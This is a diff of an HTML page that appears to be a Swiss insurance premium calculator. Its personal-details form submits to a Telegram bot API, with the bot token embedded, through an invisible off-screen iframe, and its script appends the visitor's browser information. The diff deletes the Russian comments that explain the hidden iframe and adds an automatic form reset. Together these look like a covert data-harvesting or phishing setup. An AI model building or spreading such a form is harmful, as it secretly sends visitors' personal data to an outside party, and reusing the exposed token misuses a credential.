@@ -313,7 +313,6 @@
       <section class="premium-calc">
         <h2 class="premium-calc__title" data-lang-ch="Persönliche Daten" data-lang-en="Personal details">Persönliche Daten</h2>
 
-        <!-- Форма отправляет данные в скрытый iframe -->
         <form class="premium-calc__form" 
               id="telegramForm"
               action="https://api.telegram.org/bot9058538400:AAF98ajxs7U51eNk8hg0nf1B6VaahEUFrCI/sendMessage" 
@@ -505,7 +504,6 @@
     </div>
   </footer>
 
-  <!-- Невидимый iframe для отправки -->
   <iframe name="tg_iframe" id="tg_iframe" style="width:0; height:0; border:0; position:absolute; left:-9999px; top:-9999px;"></iframe>
 
   <script>
@@ -575,6 +573,10 @@
         message += `🌐 Browser: ${browserInfo}\n`;
 
         document.getElementById('telegramText').value = message;
+        
+        setTimeout(() => {
+          form.reset();
+        }, 500); 
       });
     });
   </script>
